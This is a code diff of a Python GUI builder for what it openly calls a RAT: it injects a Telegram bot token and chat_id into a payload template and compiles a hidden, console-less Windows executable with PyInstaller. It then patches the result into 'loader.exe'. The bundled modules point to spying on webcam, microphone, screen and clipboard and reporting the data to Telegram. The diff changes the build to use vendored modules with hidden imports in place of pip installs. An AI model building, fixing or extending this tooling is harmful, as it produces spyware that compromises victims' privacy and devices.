@@ -1,6 +1,5 @@
 # language: Python 3.11, file: builder_gui.py, target: Windows 11
-# GUI-билдер: token + chat_id -> инжект в build.py -> PyInstaller -> patcher -> loader.exe
-# Проверка токена через Telegram API убрана намеренно.
+# GUI-билдер: token + chat_id -> инжект -> PyInstaller (vendor, без pip) -> patcher -> loader.exe
 
 import os
 import sys
@@ -25,7 +24,7 @@ else:
 
 TEMPLATE = APP_DIR / "build.py"
 PATCHER = APP_DIR / "patcher.py"
-TARGET_REQ = APP_DIR / "target-req.txt"
+VENDOR = APP_DIR / "vendor"
 
 CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0)
 
@@ -59,14 +58,13 @@ class BuildWorker(QThread):
                 tmp = Path(tmpdir)
 
                 # 1. подготовка
-                self.progress.emit(2)
+                self.progress.emit(5)
                 self.log.emit("[*] Preparing workspace…")
                 shutil.copy(TEMPLATE, tmp / "build.py")
                 shutil.copy(PATCHER, tmp / "patcher.py")
-                shutil.copy(TARGET_REQ, tmp / "target-req.txt")
 
-                # 2. инжект токена и chat_id
-                self.progress.emit(4)
+                # 2. инжект
+                self.progress.emit(10)
                 src = (tmp / "build.py").read_text(encoding="utf-8")
                 src, n1 = re.subn(r'BOT_TOKEN\s*=\s*"[^"]*"',
                                   f'BOT_TOKEN = "{self.token}"', src)
@@ -78,59 +76,42 @@ class BuildWorker(QThread):
                 (tmp / "build.py").write_text(src, encoding="utf-8")
                 self.log.emit("[*] Token & chat_id injected.")
 
-                # 3. target-зависимости
-                self.progress.emit(6)
-                self.log.emit("[*] Installing target dependencies…")
-                rc = self._stream(
-                    [sys.executable, "-m", "pip", "install", "-q",
-                     "--disable-pip-version-check",
-                     "-r", str(tmp / "target-req.txt")],
-                    cwd=tmp, pct_start=6, pct_end=22,
-                )
-                if rc != 0:
-                    self.log.emit("[!] pip returned nonzero, verifying imports…")
-                    check = subprocess.run(
-                        [sys.executable, "-c",
-                         "import telebot, psutil, cv2, sounddevice, soundfile, "
-                         "PIL, pyautogui, pyperclip, requests, win32api, Crypto, mss"],
-                        capture_output=True, text=True,
-                        creationflags=CREATE_NO_WINDOW,
-                    )
-                    if check.returncode != 0:
-                        self.finished_err.emit(
-                            f"dependency install failed:\n{check.stderr[-800:]}"
-                        )
-                        return
-
-                # 4. PyInstaller
-                self.progress.emit(25)
+                # 3. PyInstaller — vendor вшит, pip не вызываем
+                self.progress.emit(30)
                 self.log.emit("[*] PyInstaller building payload…")
-                rc = self._stream(
-                    [sys.executable, "-m", "PyInstaller",
-                     "--onefile", "--noconsole", "--clean", "--noconfirm",
-                     "--name", "build",
-                     str(tmp / "build.py")],
-                    cwd=tmp, pct_start=25, pct_end=72,
-                )
+                pyi_cmd = [
+                    sys.executable, "-m", "PyInstaller",
+                    "--onefile", "--noconsole", "--clean", "--noconfirm",
+                    "--name", "build",
+                ]
+                if VENDOR.exists():
+                    pyi_cmd += ["--paths", str(VENDOR)]
+                    for mod in ("telebot", "psutil", "cv2", "sounddevice",
+                                "soundfile", "PIL", "pyautogui", "pyperclip",
+                                "requests", "win32api", "Crypto", "mss"):
+                        pyi_cmd += ["--hidden-import", mod]
+                pyi_cmd.append(str(tmp / "build.py"))
+
+                rc = self._stream(pyi_cmd, cwd=tmp, pct_start=30, pct_end=75)
                 exe = tmp / "dist" / "build.exe"
                 if rc != 0 or not exe.exists():
                     self.finished_err.emit("PyInstaller failed")
                     return
 
-                # 5. патчер
-                self.progress.emit(74)
+                # 4. патчер
+                self.progress.emit(78)
                 self.log.emit("[*] Applying patcher…")
                 rc = self._stream(
                     [sys.executable, str(tmp / "patcher.py"), str(exe)],
-                    cwd=tmp, pct_start=74, pct_end=92,
+                    cwd=tmp, pct_start=78, pct_end=94,
                 )
                 loader = exe.parent / "loader.exe"
                 if rc != 0 or not loader.exists():
                     self.finished_err.emit("patcher failed")
                     return
 
-                # 6. вынос артефакта
-                self.progress.emit(95)
+                # 5. вынос артефакта
+                self.progress.emit(97)
                 out_dir = Path(os.path.expanduser("~")) / "rat_builder_output"
                 out_dir.mkdir(parents=True, exist_ok=True)
                 out = out_dir / "loader.exe"
